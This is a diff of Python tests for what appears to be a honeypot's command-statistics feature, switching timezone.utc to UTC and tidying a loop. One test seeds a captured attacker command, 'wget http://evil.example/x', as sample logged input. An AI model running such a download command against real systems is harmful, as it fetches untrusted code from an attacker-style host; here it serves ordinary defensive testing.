@@ -1,4 +1,4 @@
-from datetime import datetime, timedelta, timezone
+from datetime import UTC, datetime, timedelta
 
 from app.commands_stats import get_commands_stats
 from app.db import connect
@@ -13,7 +13,7 @@ def _seed_session_with_commands(db, session_id, connect_time, commands):
         "INSERT INTO sessions (session_id, src_ip, connect_time) VALUES (?, '1.2.3.4', ?)",
         (session_id, connect_time),
     )
-    for i, (text, ts) in enumerate(commands):
+    for text, ts in commands:
         db.execute(
             "INSERT INTO commands (session_id, timestamp, input_text) VALUES (?, ?, ?)",
             (session_id, ts, text),
@@ -22,7 +22,7 @@ def _seed_session_with_commands(db, session_id, connect_time, commands):
 
 def test_ranks_commands_by_occurrence_count_descending(tmp_path):
     db = connect(tmp_path / "db.sqlite3")
-    now = datetime.now(timezone.utc)
+    now = datetime.now(UTC)
     _seed_session_with_commands(db, "s1", _iso(now), [("whoami", _iso(now)), ("ls", _iso(now))])
     _seed_session_with_commands(db, "s2", _iso(now), [("whoami", _iso(now))])
     db.commit()
@@ -37,8 +37,8 @@ def test_ranks_commands_by_occurrence_count_descending(tmp_path):
 
 def test_last_seen_is_the_max_timestamp_for_that_command(tmp_path):
     db = connect(tmp_path / "db.sqlite3")
-    earlier = datetime.now(timezone.utc) - timedelta(hours=2)
-    later = datetime.now(timezone.utc)
+    earlier = datetime.now(UTC) - timedelta(hours=2)
+    later = datetime.now(UTC)
     _seed_session_with_commands(db, "s1", _iso(earlier), [("whoami", _iso(earlier))])
     _seed_session_with_commands(db, "s2", _iso(later), [("whoami", _iso(later))])
     db.commit()
@@ -49,7 +49,7 @@ def test_last_seen_is_the_max_timestamp_for_that_command(tmp_path):
 
 def test_period_filters_via_the_session_connect_time(tmp_path):
     db = connect(tmp_path / "db.sqlite3")
-    now = datetime.now(timezone.utc)
+    now = datetime.now(UTC)
     old = now - timedelta(days=10)
     _seed_session_with_commands(db, "recent", _iso(now), [("whoami", _iso(now))])
     _seed_session_with_commands(db, "old", _iso(old), [("ls", _iso(old))])
@@ -64,7 +64,7 @@ def test_period_filters_via_the_session_connect_time(tmp_path):
 
 def test_q_filters_by_substring(tmp_path):
     db = connect(tmp_path / "db.sqlite3")
-    now = datetime.now(timezone.utc)
+    now = datetime.now(UTC)
     _seed_session_with_commands(
         db, "s1", _iso(now), [("wget http://evil.example/x", _iso(now)), ("whoami", _iso(now))]
     )
@@ -76,7 +76,7 @@ def test_q_filters_by_substring(tmp_path):
 
 def test_q_with_percent_wildcard_does_not_crash(tmp_path):
     db = connect(tmp_path / "db.sqlite3")
-    now = datetime.now(timezone.utc)
+    now = datetime.now(UTC)
     _seed_session_with_commands(db, "s1", _iso(now), [("whoami", _iso(now))])
     db.commit()
 
@@ -86,7 +86,7 @@ def test_q_with_percent_wildcard_does_not_crash(tmp_path):
 
 def test_pagination_limit_and_offset(tmp_path):
     db = connect(tmp_path / "db.sqlite3")
-    now = datetime.now(timezone.utc)
+    now = datetime.now(UTC)
     _seed_session_with_commands(
         db, "s1", _iso(now), [("a", _iso(now)), ("b", _iso(now)), ("c", _iso(now))]
     )
